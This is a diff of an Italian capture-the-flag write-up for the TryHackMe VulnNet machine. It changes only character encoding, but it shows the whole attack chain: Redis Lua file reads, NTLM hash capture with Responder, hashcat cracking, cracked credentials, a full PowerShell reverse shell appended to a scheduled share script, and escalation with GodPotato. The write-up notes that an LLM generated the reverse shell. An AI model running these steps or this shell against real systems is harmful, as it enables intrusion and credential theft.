@@ -62,7 +62,7 @@ Risultato:
 49666-49698/tcp open  msrpc   Microsoft Windows RPC (varie porte dinamiche)
 
 Host script results:
-| smb2-security-mode: 3.1.1: Message signing enabled and required
+&#124; smb2-security-mode: 3.1.1: Message signing enabled and required
 Service Info: OS: Windows
 
 l'analisi porta per porta, che è quella che conta più del vettore in sé:
@@ -102,14 +102,14 @@ passando contesto, versione di Redis e la domanda sulle vulnerabilità note all'
 verifico prima su un file di sistema noto:
 
 redis-cli -h 10.112.187.155 eval "return dofile('C:\\Windows\\win.ini')" 0
-(error) ... win.ini:1: unexpected symbol near ';'
+(error) &#46;&#46;&#46; win.ini:1: unexpected symbol near ';'
 
 funziona: interpreta il contenuto del file come Lua e lo sputa nell'errore. la task della room indica esplicitamente il percorso (Desktop\user.txt),quindi vado dritto lì senza tirare a indovinare:
 
 redis-cli -h 10.112.187.155 eval "return dofile('C:\\Users\\enterprise-security\\Desktop\\user.txt')" 0
-(error) ... user.txt:1: malformed number near '3eb176aee96432d5b100bc93580b291e'
+(error) &#46;&#46;&#46; user.txt:1: malformed number near '3eb176aee96432d5b100bc93580b291e'
 
-qui mi sono bloccato un attimo: non capivo se malformed number fosse un output sbagliato o se quel 3eb1... andasse trasformato in qualche modo. provando la stringa sul sito, answer incorrect. il motivo è che dofile interpreta il contenuto come Lua e il prefisso THM{ fa scattare l'errore di sintassi che tronca l'output prima della parte numerica, lasciando visibile solo la parte esadecimale. ricomponendo il formato standard delle flag TryHackMe:
+qui mi sono bloccato un attimo: non capivo se malformed number fosse un output sbagliato o se quel 3eb1&#46;&#46;&#46; andasse trasformato in qualche modo. provando la stringa sul sito, answer incorrect. il motivo è che dofile interpreta il contenuto come Lua e il prefisso THM{ fa scattare l'errore di sintassi che tronca l'output prima della parte numerica, lasciando visibile solo la parte esadecimale. ricomponendo il formato standard delle flag TryHackMe:
 
 user flag: THM{3eb176aee96432d5b100bc93580b291e}
 
@@ -133,7 +133,7 @@ redis-cli -h 10.112.187.155 -t 5 config set dir "\\192.168.134.214\share"
 il config fallisce con Permission denied, ma il tentativo di raggiungere il path UNC scatta prima del rifiuto, e Responder intercetta l'hash:
 
 [SMB] NTLMv2-SSP Username : VULNNET\enterprise-security
-[SMB] NTLMv2-SSP Hash     : enterprise-security::VULNNET:...
+[SMB] NTLMv2-SSP Hash     : enterprise-security::VULNNET:&#46;&#46;&#46;
 
 salvo l'hash su file e lo cracco con rockyou. la modalità NetNTLMv2 su hashcat è la 5600:
 
@@ -141,7 +141,7 @@ hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
 
 rockyou ci ha messo insolitamente tanto per un hash che poi cade a un quarto della wordlist. Status: Cracked, la password compare in fondo alla riga dell'hash dopo i due punti:
 
-enterprise-security::VULNNET:...:sand_0873959498
+enterprise-security::VULNNET:&#46;&#46;&#46;:sand_0873959498
 
 credenziali: enterprise-security / sand_0873959498.
 
@@ -151,10 +151,10 @@ credenziali: enterprise-security / sand_0873959498.
 
 con le credenziali valide enumero le share. smbclient va in timeout al primo tentativo (comportamento ricorrente su questa macchina per tutta la sessione), netexec invece passa:
 
-netexec smb 10.112.187.155 -u 'enterprise-security' -p 'sand_0873959498' --shares
+netexec smb 10.112.187.155 -u 'enterprise-security' -p 'sand_0873959498' &#45;&#45;shares
 
 Share            Permissions   Remark
------            -----------   ------
+&#45;&#45;&#45;&#45;-            &#45;&#45;&#45;&#45;&#45;&#45;&#45;&#45;&#45;&#45;-   &#45;&#45;&#45;&#45;&#45;&#45;
 ADMIN$                         Remote Admin
 C$                             Default share
 Enterprise-Share READ,WRITE
@@ -173,7 +173,7 @@ smbclient con -m SMB3 forzato si connette (la scansione iniziale riportava SMB d
 smbclient //10.112.187.155/Enterprise-Share -U 'enterprise-security%sand_0873959498' -m SMB3
 
 smb: \> dir
-  PurgeIrrelevantData_1826.ps1        A       69  ...
+  PurgeIrrelevantData_1826.ps1        A       69  &#46;&#46;&#46;
 
 un solo file, uno script .ps1 (PowerShell). era l'unica pista e l'unica cosa visibile. lo scarico e lo leggo:
 
@@ -189,7 +189,7 @@ lo script cancella file in una cartella pubblica. il nome col numero, la posizio
 
 come ultimo tentativo chiedo all'llm di preparare una reverse shell PowerShell: in passato, su macchine TryHackMe che puntano tutto su un unico vettore, la piattaforma è fissata con le reverse shell sul servizio, e qui lo schema si ripete. lo script della reverse shell l'ha generato l'llm. lo appendo allo script esistente:
 
-echo '$client = New-Object System.Net.Sockets.TCPClient("192.168.134.214",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()' >> PurgeIrrelevantData_1826.ps1
+echo '$client = New-Object System.Net.Sockets.TCPClient("192.168.134.214",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535&#124;%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 &#124; Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()' >> PurgeIrrelevantData_1826.ps1
 
 metto netcat in ascolto:
 
@@ -201,7 +201,7 @@ smbclient //10.112.187.155/Enterprise-Share -U 'enterprise-security%sand_0873959
 
 dopo un paio di minuti il task esegue e la shell arriva:
 
-connect to [192.168.134.214] from (UNKNOWN) ...
+connect to [192.168.134.214] from (UNKNOWN) &#46;&#46;&#46;
 PS C:\Users\enterprise-security\Downloads> whoami
 vulnnet\enterprise-security
 
@@ -276,4 +276,4 @@ SeImpersonatePrivilege su un account a bassi privilegi è di fatto una scalata a
 
 ## Tool utilizzati
 
-nmap, redis-cli, Responder, hashcat (-m 5600 NetNTLMv2), netexec (smb --shares, winrm), smbclient (-m SMB3), netcat, GodPotato (V1.20, GodPotato-NET4.exe), PowerShell (reverse shell)
+nmap, redis-cli, Responder, hashcat (-m 5600 NetNTLMv2), netexec (smb &#45;&#45;shares, winrm), smbclient (-m SMB3), netcat, GodPotato (V1.20, GodPotato-NET4.exe), PowerShell (reverse shell)
